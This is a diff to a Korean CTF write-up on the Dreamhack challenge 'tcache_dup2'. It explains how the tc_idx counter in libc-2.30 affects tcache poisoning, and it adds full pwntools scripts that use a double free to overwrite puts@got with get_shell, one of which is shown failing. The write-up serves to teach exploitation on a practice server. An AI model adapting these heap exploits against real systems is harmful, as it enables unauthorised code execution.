@@ -141,7 +141,10 @@ int main()
 
 따라서, 이렇게 되면 `tcache_poisoning`을 통해 추가했던 청크를 가져오지 않기 때문에 추가한 `got` 주소를 제대로 가져올 수 없게 된다.
 
-따라서, `create`를 연속 2번 해서 서로 다른 2개의 청크를 만든 후 `delete`를 2번 해줘서 `tcache`에 청크를 2개 추가하여 `tc_idx = 2`로 만들어준 후 위의 `1. 2. 3.` 과정을 다시 진행해주면 `tc_idx`의 영향을 받지 않고 정상적으로 익스플로잇 할 수 있다.\
+**그래서 `Tcache Poisoning`을 할 때, 항상 `Double Free`를 해줘야 하는 이유이다.** `ex-1.py` 처럼 `Double Free` 이후에 바로 `edit`을 해줘서 `tc_idx`를 계속 `1` 이상으로 유지해줘도 되고,\
+(`Double Free` 이후, 바로 `edit`으로 청크를 추가하지 않고 `create`로 빼주고 청크를 추가하면 `ex-wrong4.py`처럼 `tc_idx`가 마지막에 `create` 전에 `0`이 되어서 실패함)
+
+`ex-2.py`처럼 `create`를 연속 2번 해서 서로 다른 2개의 청크를 만든 후 `delete`를 2번 해줘서 `Double Free` 없이, `tcache`에 청크를 2개 추가하여 `tc_idx = 2`로 만들어준 후 위의 `1. 2. 3.` 과정을 다시 진행해주면 `tc_idx`의 영향을 받지 않고 정상적으로 익스플로잇 할 수 있다.\
 (**이걸로는 부족하기 때문에 아래의 실패 이유 2.도 잘 봐야함** )
 
 `tcache_dup`와 `Tcache Poisoning` 문제에서는 `Ubuntu 18.04, libc-2.27.so` 버전이었지만, 이번 문제에서는 `Ubuntu 19.10, libc-2.30.so`라 `tc_idx`의 도입 여부로 인해 차이가 생기는 듯하다.
@@ -199,7 +202,80 @@ printf("3. Delete heap\n");
  
 `puts@got`는 위의 이미지에서 보듯이 뒤에 카나리가 변조되었을 때 호출되는 `__stack_chk_fail@got`이 존재하기 때문이다.
 
-# Exploit : `ex.py`
+# Exploit : `ex-1.py`
+
+```
+from pwn import *
+
+p = remote('host3.dreamhack.games', 21924)
+elf = ELF('./tcache_dup2')
+
+
+def create(size, data):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+
+
+def modify(idx, size, data):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'idx: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+
+
+def delete(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'idx: ', str(idx).encode())
+
+
+# tcache[0x20] : empty
+# tc_idx = 0
+# chunk : ptr[0]
+create(0x20, b'a')
+
+
+# tcache[0x20] : ptr[0]
+# tc_idx = 1
+# chunk : ptr[0]
+delete(0)
+
+
+# tcache[0x20] : ptr[0] -> b'aaaaaaaa'
+# tc_idx = 1
+# chunk : ptr[0]
+modify(0, 0x10, b'a'*0x9)
+
+
+# tcache[0x20] : ptr[0] -> ptr[0] + 0x10
+# tc_idx = 2
+# chunk : ptr[0]
+delete(0)
+
+
+# tcache[0x20] : ptr[0] -> puts@got
+# tc_idx = 2
+# chunk : ptr[0]
+puts_got = elf.got['puts']
+modify(0, 0x10, p64(puts_got))
+
+
+# tcache[0x20] : puts@got
+# tc_idx = 1
+# chunk : ptr[1]
+create(0x20, b'a')
+
+
+# tcache[0x20] : empty
+# tc_idx = 0
+# chunk : ptr[3]
+get_shell = elf.symbols['get_shell']
+create(0x20, p64(get_shell))
+
+p.interactive()
+```
+
+# Exploit : `ex-2.py`
 
 ```
 from pwn import *
@@ -471,6 +547,81 @@ create(0x20, p64(get_shell))
 # 따라서 여기서 puts@got가 바뀌면, puts로 바뀐 printf 들이 출력이 안되서, `recvafter`에서 무한대기해서 아래로 못내려감
 
 delete(0)
+
+p.interactive()
+```
+
+# `ex.wrong4.py`
+
+참고로 `Double Free`를 통해 처음에 `tc_idx = 2`로 만들어주더라도, 바로 `edit` 으로 중복된 청크를 날리지 않고 `create`를 해주면 마지막에 `tc_idx = 0`인 상태에서 `GOT Overwrite`를 하게 되어서 익스플로잇에 성공하지 않게 된다.
+
+```
+from pwn import *
+
+p = remote('host3.dreamhack.games', 21924)
+elf = ELF('./tcache_dup2')
+
+
+def create(size, data):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+
+
+def modify(idx, size, data):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'idx: ', str(idx).encode())
+    p.sendlineafter(b'Size: ', str(size).encode())
+    p.sendafter(b'Data: ', data)
+
+
+def delete(idx):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'idx: ', str(idx).encode())
+
+
+# tcache[0x20] : empty
+# tc_idx = 0
+# chunk : ptr[0]
+create(0x20, b'a')
+
+
+# tcache[0x20] : ptr[0]
+# tc_idx = 1
+# chunk : ptr[0]
+delete(0)
+
+
+# tcache[0x20] : ptr[0] -> b'aaaaaaaa'
+# tc_idx = 1
+# chunk : ptr[0]
+modify(0, 0x10, b'a'*0x9)
+
+
+# tcache[0x20] : ptr[0] -> ptr[0] + 0x10
+# tc_idx = 2
+# chunk : ptr[0]
+delete(0)
+
+
+# tcache[0x20] : ptr[0] -> puts@got
+# tc_idx = 1
+# chunk : ptr[1]
+puts_got = elf.got['puts']
+create(0x20, p64(puts_got))
+
+
+# tcache[0x20] : puts@got
+# tc_idx = 0
+# chunk : ptr[2]
+create(0x20, b'a')
+
+# 여기서 tcache를 통해 가져오지 않게 됨
+# tcache[0x20] : empty
+# tc_idx = 0
+# chunk : ptr[3]
+get_shell = elf.symbols['get_shell']
+create(0x20, p64(get_shell))
 
 p.interactive()
 ```
